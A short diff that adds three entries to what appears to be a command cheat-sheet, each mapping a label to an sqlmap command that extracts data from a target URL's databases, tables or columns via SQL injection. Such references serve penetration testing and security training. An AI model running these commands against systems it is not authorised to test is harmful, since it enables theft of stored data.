@@ -1,0 +1,3 @@
+Dump All Data (from all databases)=sqlmap -u "<target_url>" --dump-all
+Dump Table Data (from a specific table)=sqlmap -u "<target_url>" -D <database_name> -T <table_name> --dump
+Dump Specific Columns (from a specific table)=sqlmap -u "<target_url>" -D <database_name> -T <table_name> -C <columns> --dump
